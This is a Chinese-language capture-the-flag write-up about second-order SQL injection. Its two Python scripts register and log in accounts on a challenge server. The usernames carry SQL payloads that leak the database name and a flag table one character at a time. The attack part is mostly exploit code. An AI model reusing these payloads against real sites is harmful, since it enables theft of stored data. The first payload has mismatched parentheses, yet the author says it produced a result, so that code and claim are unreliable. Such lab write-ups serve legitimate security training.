这题考察二次注入，没有把表名给探测出来，多少缺失一点成就感。SQL 二次注入（Second-Order SQL Injection）是指攻击者在一个 SQL 注入的过程中，将恶意输入数据存储在数据库中，而不是立即触发 SQL 注入攻击。然后，攻击者通过其他途径或后续的请求触发这些存储的数据，从而实现攻击。

编写脚本，反复注册，登录，得到数据库名称是 web

```
import requests
import re


register_url = 'http://61.147.171.105:60039/register.php'
login_url = 'http://61.147.171.105:60039/login.php'


for i in range(1, 4):
    register_data = {
        'email': 'abc{}@qq.com'.format(i),
        'username': "0' + ascii(substr(database()) from {} for 1)) + '0".format(i),
        'password': '123456'
    }
    res = requests.post(url=register_url, data=register_data)

    login_data = {
        'email': 'abc{}@qq.com'.format(i),
        'password': '123456'
    }
    res_ = requests.post(url=login_url, data=login_data)
    code = re.search(r'<span class="user-name">\s*(\d*)\s*</span>', res_.text)
    print(chr(int(code.group(1))), end='')
```

网上的 writeup 都是盲猜表名是 flag，然后使用脚本反复注册，登录，提取出flag

```
import requests
import re

register_url = 'http://61.147.171.105:53955/register.php'
login_url = 'http://61.147.171.105:53955/login.php'

flag = ""
for i in range(1, 100):
    register_data = {
        'email': 'aa{}@qq.com'.format(i),
        'username': "0'+ascii(substr((select * from flag) from {} for 1))+'0".format(i),
        'password': '123456'
    }
    res = requests.post(url=register_url, data=register_data)

    login_data = {
        'email': 'aa{}@qq.com'.format(i),
        'password': '123456'
    }
    res_ = requests.post(url=login_url, data=login_data)
    code = re.search(r'<span class="user-name">\s*(\d*)\s*</span>', res_.text)
    a = int(code.group(1))
    if a >= 32 and a <= 127:
        flag += chr(a)
    else:
        break
print(flag)
```
